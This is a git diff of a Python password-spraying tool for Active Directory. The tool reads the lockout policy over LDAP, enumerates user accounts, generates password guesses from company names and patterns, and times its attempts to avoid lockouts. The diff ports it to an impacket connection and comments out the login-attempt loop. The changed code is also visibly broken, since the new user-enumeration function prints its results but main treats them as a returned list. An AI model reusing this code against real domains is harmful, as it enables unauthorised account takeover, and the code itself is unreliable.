@@ -256,9 +256,11 @@ def get_lockout_policy(server, base_dn, domain, user, password):
 
 def get_lockout_policy_impacket(conn):
     for i in conn.search("(objectClass=domain)", ['lockoutthreshold', 'lockoutduration', 'lockoutobservationwindow', 'minpwdlength', 'pwdproperties', 'pwdhistorylength']):
-        print(i)
-        print(type(i))
+        return i
     
+def enumerate_user_attributes_impacket(conn):
+    for i in conn.search("(&(objectCategory=person)(objectClass=user))", ['samaccountName', 'givenname', 'sn']):
+        print(i)
 
 
 def enumerate_user_attributes(server, base_dn, domain, user, password):
@@ -384,53 +386,42 @@ def main():
     parser.add_argument('--verbose', action='store_true', help='Enable verbose output for each login attempt')
     args = parser.parse_args()
 
-    #try:
-    #    server = Server(args.host, get_info=ALL)
-    #    base_dn = get_default_naming_context(server, args.domain, args.username, args.password)
-    #except Exception as e:
-    #    server = Server(args.host, get_info=ALL, use_ssl=True, tls=Tls(validate=ssl.CERT_NONE))
-    #    base_dn = get_default_naming_context(server, args.domain, args.username, args.password)
-
     conn = ImpacketLDAPConnector(args.host, 1, args.domain, args.username, args.password)
 
     policy = get_lockout_policy_impacket(conn)
-    print(policy)
-
-    return
 
     dynamic_delay = policy['lockoutObservationWindow'] + args.extra_delay if policy['lockoutObservationWindow'] > 0 else 1.0 + args.extra_delay
 
-    print(f"[*] Lockout Threshold: {policy['lockoutThreshold']} attempts")
-    print(f"[*] Lockout Observation Window: {policy['lockoutObservationWindow']} seconds")
-    print(f"[*] Lockout Duration: {policy['lockoutDuration']} seconds")
-    print(f"[*] Password Complexity: {policy['pwdProperties']}")
-    print(f"[*] Minimum Password Length: {policy['minPwdLength']}")
-    print(f"[*] Password History Length: {policy['pwdHistoryLength']}")
+    print(f"[*] Lockout Threshold: {policy['lockoutthreshold']} attempts")
+    print(f"[*] Lockout Observation Window: {policy['lockoutobservationwindow']} seconds")
+    print(f"[*] Lockout Duration: {policy['lockoutduration']} seconds")
+    print(f"[*] Password Complexity: {policy['pwdproperties']}")
+    print(f"[*] Minimum Password Length: {policy['minpwdlength']}")
+    print(f"[*] Password History Length: {policy['pwdhistorylength']}")
     if args.verbose:
         print("[*] Enumerating users...")
 
-    user_attrs = enumerate_user_attributes(server, base_dn, args.domain, args.username, args.password)
+    user_attrs = enumerate_user_attributes_impacket(conn)
     if args.verbose or args.check:
         print(f"[*] Found {len(user_attrs)} users before filtering")
 
     filtered_users = filter_users(user_attrs, args.exclude_regex)
 
-
     if args.check == 1:
         return
 
-    if policy['lockoutThreshold'] == 1:
+    if policy['lockoutthreshold'] == 1:
         print("[!] Lockout threshold is 1. Bruteforce is too risky and will not be performed.")
         return
     
-    time_based_tries = parse_time_based_tries(args.time_based_tries)
+    
 
     all_attempts: List[UserPasswordContainer] = []
     for user in filtered_users:
-        passwords = generate_passwords_from_toml(args.patterns, args.company_names, user, policy['minPwdLength'], {"complex_password" : policy['pwdProperties']})
+        passwords = generate_passwords_from_toml(args.patterns, args.company_names, user, policy['minpwdlength'], {"complex_password" : policy['pwdproperties']})
         if len(passwords) <= 0:
             continue
-        all_attempts.append(UserPasswordContainer(args.domain, user.get("sAMAccountName", ""), passwords, policy['lockoutThreshold']))
+        all_attempts.append(UserPasswordContainer(args.domain, user.get("samaccountName", ""), passwords, policy['lockoutthreshold']))
 
     if args.verbose or args.check:
         print(f"[*] {len(all_attempts)} users remaining after filtering")
@@ -440,6 +431,8 @@ def main():
             for pw in container.passwords:
                 print(f"{container.username}:{pw}")
         return
+    
+    time_based_tries = parse_time_based_tries(args.time_based_tries)
     
     print(f"[*] Maximum passwords to try per user:")
     for container in all_attempts:
@@ -459,10 +452,10 @@ def main():
             time.sleep(1)
         if args.verbose:
             print(f"[*] Trying at time of {get_current_time()}")
-        conn = get_connection(server, args.domain, args.username, args.password)
-        for container in all_attempts[:]:
-            if container.try_next_password(conn, server, policy['lockoutThreshold'], args.verbose):
-                all_attempts.remove(container)
+        #conn = get_connection(server, args.domain, args.username, args.password)
+        #for container in all_attempts[:]:
+        #    if container.try_next_password(conn, server, policy['lockoutThreshold'], args.verbose):
+        #        all_attempts.remove(container)
         if args.verbose:
             print(f"[*] Sleeping for {dynamic_delay}...")
         time.sleep(dynamic_delay)
